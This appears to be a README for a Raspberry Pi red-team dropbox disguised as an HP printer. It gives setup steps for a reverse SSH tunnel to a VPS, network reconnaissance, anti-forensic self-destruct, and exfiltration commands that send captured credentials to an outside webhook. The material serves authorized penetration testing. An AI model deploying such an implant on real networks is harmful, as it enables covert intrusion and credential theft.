# Red Teaming Dropbox V2 - "Phantom Printer" 🖨️👻

> The most comprehensive red teaming dropbox ever built. Drop it on a network, walk away, and control everything remotely.

A physical penetration testing device built on Raspberry Pi 5 that disguises itself as an HP LaserJet printer while providing persistent command & control, automated reconnaissance, and data exfiltration capabilities.

![Raspberry Pi 5](https://img.shields.io/badge/Raspberry%20Pi-5-red?style=flat-square&logo=raspberrypi)
![Kali Linux](https://img.shields.io/badge/Kali%20Linux-ARM64-blue?style=flat-square&logo=kalilinux)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)

---

## Features

| Feature | Description |
|---------|-------------|
| 🎭 **HP Printer Disguise** | MAC spoofing, hostname emulation, mDNS/Bonjour advertisement, fake web interface |
| 🔌 **Persistent C2** | Auto-reconnecting SSH tunnel via autossh with failover capabilities |
| 📡 **n8n Integration** | Webhooks for heartbeat, alerts, and loot exfiltration to Discord/Slack |
| 🔍 **Auto Reconnaissance** | ARP scan, nmap discovery, service enumeration, SMB enumeration |
| 💀 **Self-Destruct** | 4 levels of destruction (quick, standard, full, nuclear) with dead man's switch |
| 📤 **Data Exfiltration** | Automated loot collection and exfil via webhooks |
| 🚀 **Zero-Touch Boot** | Auto-login, auto-connect, auto-stealth - just power on and walk away |

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    RASPBERRY PI 5 - "HP LaserJet Pro MFP M428fdw"       │
├─────────────────────────────────────────────────────────────────────────┤
│  STEALTH LAYER    │  C2 LAYER        │  n8n ENGINE    │  ATTACK MODULES │
│  ─────────────    │  ────────        │  ──────────    │  ────────────── │
│  MAC Spoofing     │  AutoSSH         │  Webhooks      │  Recon Auto     │
│  HP Hostname      │  Reverse Tunnel  │  Alerts        │  Responder      │
│  Printer Ports    │  Heartbeat       │  Loot Mgmt     │  SMB Enum       │
│  mDNS/Bonjour     │  Failover        │  Discord       │  Port Scans     │
├─────────────────────────────────────────────────────────────────────────┤
│                       OPERATIONAL SECURITY                              │
│  Auto-Login | Self-Destruct | Dead Man's Switch | Kill Switch           │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
                         ┌─────────────────┐
                         │  C2 VPS         │
                         │  (Linode/DO)    │
                         │  SSH Tunnel     │
                         └────────┬────────┘
                                  │
                                  ▼
                         ┌─────────────────┐
                         │  n8n Server     │
                         │  (Hostinger)    │
                         │  Webhooks       │
                         └────────┬────────┘
                                  │
                                  ▼
                         ┌─────────────────┐
                         │  Discord/Slack  │
                         │  Alerts         │
                         └─────────────────┘
```

---

## Hardware Requirements

### Required
| Component | Specification |
|-----------|--------------|
| Raspberry Pi 5 | 8GB RAM recommended |
| SD Card | 128GB+ Class 10/A2 rated |
| Power Supply | 27W USB-C (official Pi 5 supply) |
| Ethernet Cable | For wired network access |

### Recommended
| Component | Purpose |
|-----------|---------|
| USB Ethernet Adapter | Dual-homed attacks |
| Alfa AWUS036ACH | WiFi attacks (monitor mode) |
| PoE+ HAT | Drop-and-forget power |
| Small enclosure | Disguise as network equipment |

---

## Quick Start

### Phase 1: Flash Kali Linux

1. Download **Kali Linux Raspberry Pi 5 ARM64** from [kali.org/get-kali](https://www.kali.org/get-kali/#kali-arm)
2. Open **Raspberry Pi Imager**
3. Choose Device → **Raspberry Pi 5**
4. Choose OS → **Use Custom** → Select Kali image
5. Choose Storage → Your SD card
6. Click ⚙️ **Edit Settings**:
   - Set hostname: `kali`
   - Enable SSH: ✅ Password authentication
   - Set username: `kali` / password: `your-password`
   - Configure WiFi (optional)
7. Write and boot

### Phase 2: Install Dropbox

SSH into your Pi or connect via monitor:

```bash
ssh kali@kali.local
```

Clone and install:

```bash
git clone https://github.com/un1xr00t/red-teaming-dropbox-v2 ~/dropbox-v2
cd ~/dropbox-v2
chmod +x install.sh
sudo ./install.sh
```

The installer will:
- Install all dependencies
- Create directory structure
- Set up systemd services
- Convert to headless mode (CLI only)
- Generate SSH keys for C2

### Phase 3: Set Up C2 VPS

Spin up a cheap VPS (Linode Nanode $5/mo works great):
- **OS:** Ubuntu 22.04 LTS
- **Region:** Close to target area

SSH into your VPS and run:

```bash
wget https://raw.githubusercontent.com/un1xr00t/red-teaming-dropbox-v2/main/c2-setup.sh
chmod +x c2-setup.sh
sudo ./c2-setup.sh
```

This will:
- Harden the system (UFW, fail2ban)
- Create `dropbox` user for SSH tunnels
- Configure SSH for reverse tunnels
- Open port 2222 for tunnel access

### Phase 4: Connect Pi to C2

On the **VPS**, add the Pi's SSH key:

```bash
nano /home/dropbox/.ssh/authorized_keys
```

Paste the key shown at the end of the Pi install (or run `cat ~/.ssh/id_dropbox.pub` on Pi).

On the **Pi**, edit the config:

```bash
nano ~/dropbox-v2/config/dropbox.conf
```

Update these values:

```bash
C2_PRIMARY_HOST="YOUR_VPS_IP"
C2_PRIMARY_PORT="22"
C2_PRIMARY_USER="dropbox"
C2_TUNNEL_PORT="2222"
```

Test the connection:

```bash
ssh -i ~/.ssh/id_dropbox dropbox@YOUR_VPS_IP
```

### Phase 5: Set Up n8n Alerts

1. Set up n8n (self-hosted or cloud)
2. Create a Discord webhook in your server
3. Import the workflow from `n8n/workflows/phantom-printer-workflow.json`
4. Update your Discord webhook URL in the workflow
5. Activate the workflow

Update Pi config with your n8n URL:

```bash
nano ~/dropbox-v2/config/dropbox.conf
```

```bash
N8N_WEBHOOK_URL="https://your-n8n-instance.com"
```

Test the heartbeat:

```bash
~/dropbox-v2/modules/c2/c2.sh heartbeat
```

You should receive a Discord notification! 🎉

### Phase 6: Enable Services

```bash
sudo systemctl enable dropbox-ssh-tunnel
sudo systemctl enable dropbox-stealth
sudo systemctl enable dropbox-main

sudo systemctl start dropbox-ssh-tunnel
sudo systemctl start dropbox-stealth
sudo systemctl start dropbox-main
```

### Phase 7: Configure Auto-Login

```bash
sudo mkdir -p /etc/systemd/system/getty@tty1.service.d
sudo nano /etc/systemd/system/getty@tty1.service.d/autologin.conf
```

Paste:

```ini
[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin kali --noclear %I $TERM
```

```bash
sudo systemctl daemon-reload
sudo reboot
```

### Phase 8: Test Everything

After reboot:
1. ✅ Discord alert: "Dropbox is now online"
2. From VPS: `ssh -p 2222 kali@localhost` connects to Pi
3. On Pi: `hostname` shows `HPLJ-M428fdw`

### Phase 9: Arm for Deployment

When ready for a real engagement:

```bash
sudo ~/dropbox-v2/scripts/arm.sh
```

This will:
- Run pre-flight checks
- Disable HDMI output
- Enable all services on boot
- Clear bash history
- Lock down permissions

**Your dropbox is now ready to deploy!**

---

## Directory Structure

```
~/dropbox-v2/
├── config/
│   └── dropbox.conf           # Master configuration
├── modules/
│   ├── stealth/
│   │   └── stealth.sh         # HP printer disguise
│   ├── c2/
│   │   └── c2.sh              # Command & control
│   ├── recon/
│   │   └── recon.sh           # Network reconnaissance
│   ├── exfil/
│   │   └── exfil.sh           # Data exfiltration
│   └── opsec/
│       └── opsec.sh           # Self-destruct & kill switch
├── scripts/
│   ├── main.sh                # Main orchestrator
│   └── arm.sh                 # Deployment preparation
├── n8n/
│   └── workflows/             # n8n workflow JSON files
├── loot/
│   ├── creds/                 # Captured credentials
│   ├── hashes/                # Captured hashes
│   └── scans/                 # Scan results
└── logs/                      # Operation logs
```

---

## Module Reference

### Stealth Module

```bash
# Enable HP printer disguise
sudo ~/dropbox-v2/modules/stealth/stealth.sh enable

# Disable and restore identity
sudo ~/dropbox-v2/modules/stealth/stealth.sh disable

# Check status
sudo ~/dropbox-v2/modules/stealth/stealth.sh status
```

**What it does:**
- Spoofs MAC to HP OUI (00:1E:0B, 3C:D9:2B, 94:57:A5, etc.)
- Sets hostname to `HPLJ-M428fdw`
- Advertises via mDNS/Bonjour as IPP printer
- Opens printer ports (80, 515, 631, 9100)
- Serves fake HP web interface on port 80

### C2 Module

```bash
# Send single heartbeat
~/dropbox-v2/modules/c2/c2.sh heartbeat

# Start beacon loop
~/dropbox-v2/modules/c2/c2.sh start

# Send alert
~/dropbox-v2/modules/c2/c2.sh alert "new_creds" "critical" "Found domain admin!"

# Check status
~/dropbox-v2/modules/c2/c2.sh status
```

### Recon Module

```bash
# Quick discovery (ARP + ping sweep)
sudo ~/dropbox-v2/modules/recon/recon.sh quick

# Full reconnaissance
sudo ~/dropbox-v2/modules/recon/recon.sh full

# Individual scans
sudo ~/dropbox-v2/modules/recon/recon.sh arp
sudo ~/dropbox-v2/modules/recon/recon.sh discovery
sudo ~/dropbox-v2/modules/recon/recon.sh services
sudo ~/dropbox-v2/modules/recon/recon.sh smb

# Start Responder (analyze mode)
sudo ~/dropbox-v2/modules/recon/recon.sh responder
```

### OPSEC Module

```bash
# Self-destruct levels
sudo ~/dropbox-v2/modules/opsec/opsec.sh quick      # Wipe loot + logs
sudo ~/dropbox-v2/modules/opsec/opsec.sh standard   # + SSH keys, config
sudo ~/dropbox-v2/modules/opsec/opsec.sh full       # Delete everything
sudo ~/dropbox-v2/modules/opsec/opsec.sh nuclear    # Brick the device

# Dead man's switch
~/dropbox-v2/modules/opsec/opsec.sh deadman-check
~/dropbox-v2/modules/opsec/opsec.sh deadman-update

# Check status
~/dropbox-v2/modules/opsec/opsec.sh status
```

### Exfil Module

```bash
# Exfil data via webhook
~/dropbox-v2/modules/exfil/exfil.sh webhook "creds" "smb" "admin:Password123"

# Store credentials locally
~/dropbox-v2/modules/exfil/exfil.sh creds "smb" "admin" "Password123"

# Exfil all loot
~/dropbox-v2/modules/exfil/exfil.sh all

# Check loot status
~/dropbox-v2/modules/exfil/exfil.sh status
```

---

## Remote Access

Once deployed, access your dropbox through the VPS:

```bash
# From your VPS
ssh -p 2222 kali@localhost

# Or set up an alias
echo "alias pi='ssh -p 2222 -i ~/.ssh/id_dropbox_access kali@localhost'" >> ~/.bashrc
source ~/.bashrc
pi
```

---

## n8n Webhook Endpoints

| Endpoint | Purpose |
|----------|---------|
| `/webhook/dropbox-heartbeat` | Receive heartbeat with system info |
| `/webhook/dropbox-alert` | Receive alerts (online, offline, new creds, etc.) |
| `/webhook/dropbox-loot` | Receive exfiltrated data |

---

## Configuration Reference

Edit `~/dropbox-v2/config/dropbox.conf`:

```bash
# Identity
DROPBOX_ID="phantom-001"
HP_HOSTNAME="HPLJ-M428fdw"

# C2 Server
C2_PRIMARY_HOST="YOUR_VPS_IP"
C2_PRIMARY_PORT="22"
C2_PRIMARY_USER="dropbox"
C2_TUNNEL_PORT="2222"

# n8n Webhooks
N8N_WEBHOOK_URL="https://your-n8n-instance.com"

# Beacon timing
BEACON_INTERVAL="60"
BEACON_JITTER="30"

# Dead man's switch (hours)
DEADMAN_HOURS="24"
```

---

## Operational Security

### Pre-Deployment Checklist

- [ ] C2 VPS is hardened and tested
- [ ] SSH tunnel connects successfully
- [ ] n8n webhooks are active
- [ ] Discord alerts are working
- [ ] All services start on boot
- [ ] Auto-login is configured
- [ ] `arm.sh` has been run

### During Engagement

- Monitor Discord for heartbeats
- Access via VPS reverse tunnel only
- Run recon from the dropbox, not your machine
- Exfil loot regularly

### Extraction

If compromised or engagement complete:

```bash
# Clean exit
sudo ~/dropbox-v2/modules/opsec/opsec.sh standard

# Panic button
sudo ~/dropbox-v2/modules/opsec/opsec.sh full --force
```

---

## Troubleshooting

### SSH Tunnel Not Connecting

```bash
# Check service status
sudo systemctl status dropbox-ssh-tunnel

# Check logs
journalctl -u dropbox-ssh-tunnel -n 50

# Test manually
ssh -i ~/.ssh/id_dropbox -v dropbox@YOUR_VPS_IP
```

### No Discord Alerts

```bash
# Test webhook manually
curl -X POST https://your-n8n-url/webhook/dropbox-heartbeat \
  -H "Content-Type: application/json" \
  -d '{"dropbox_id":"test","ip_address":"1.2.3.4"}'
```

### Stealth Mode Fails

```bash
# Check if macchanger is installed
which macchanger

# Check Avahi
sudo systemctl status avahi-daemon

# Run manually with debug
sudo bash -x ~/dropbox-v2/modules/stealth/stealth.sh enable
```

---

## Legal Disclaimer

⚠️ **FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for:
- Authorized penetration testing engagements
- Red team operations with written permission
- Security research in controlled environments
- Educational purposes

**NEVER deploy on networks without explicit written authorization.**

Unauthorized use of this tool is illegal and unethical. The authors assume no liability for misuse. You are solely responsible for compliance with all applicable laws.

---

## Contributing

Pull requests welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Follow existing code style
4. Test thoroughly
5. Submit PR with description

---

## License

MIT License - See [LICENSE](LICENSE)

---

## Credits

**Built by [un1xr00t](https://github.com/un1xr00t)**

*A modern hacker who thinks like an operator* 😎

---

## Changelog

### v2.0.0 - Phantom Printer
- Complete rewrite from V1
- n8n integration for automation
- Multi-module architecture
- Enhanced HP printer emulation
- Self-destruct capabilities
- Discord/Slack alerting
- Auto-login and zero-touch boot
